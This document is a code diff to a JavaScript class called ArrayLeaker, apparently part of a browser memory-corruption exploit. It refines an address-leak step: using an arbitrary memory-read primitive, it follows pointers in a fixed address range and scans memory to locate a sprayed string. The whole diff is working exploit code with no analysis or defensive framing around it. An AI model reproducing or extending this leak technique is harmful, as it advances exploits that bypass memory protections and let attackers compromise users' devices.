@@ -93,14 +93,10 @@ class ArrayLeaker {
 		var addrStr = null;
 		var ptr1 = Util.getint32(str.substr(10, 2));
 		if (ptr1 !== 0) {
+			// TODO: Look at this case more in depth
+			
 			// Longer string
 			// Could break, not 100% sure on this
-			
-			var strOff = 0;
-			var firstInt = Util.getint32(str.substr(0, 2));
-			if (firstInt === 0xffffffae) {
-				strOff = 0x7c;
- 			}			
 			
 			var addr2 = Util.getint32(str.substr(10, 2));
 			if (addr2 < 0x80000000 || 0x8fffffff < addr2) {
@@ -113,19 +109,25 @@ class ArrayLeaker {
 				return null;
 			}
 			
-			addrStr = addr3 + strOff;
+			for (var i = 0; i < 0x220; i++) {
+				str = this.memoryReader.read(addr3 + i, this.array[index + 1].length * 2);
+				if (str === this.array[index + 1]) {
+					addrStr = addr3 + i;
+					break;
+				}
+			}
 		} else {
 			// Shorter string
 			addrStr = Util.getint32(str.substr(12, 2));
-		}
-		
-		if (addrStr < 0x80000000 || 0x8fffffff < addrStr) {
-			return null;
-		}
-		
-		str = this.memoryReader.read(addrStr, this.array[index + 1].length * 2);
-		if (str !== this.array[index + 1]) {
-			return null;
+			
+			if (addrStr < 0x80000000 || 0x8fffffff < addrStr) {
+				return null;
+			}
+			
+			str = this.memoryReader.read(addrStr, this.array[index + 1].length * 2);
+			if (str !== this.array[index + 1]) {
+				return null;
+			}
 		}
 		
 		return addrStr;
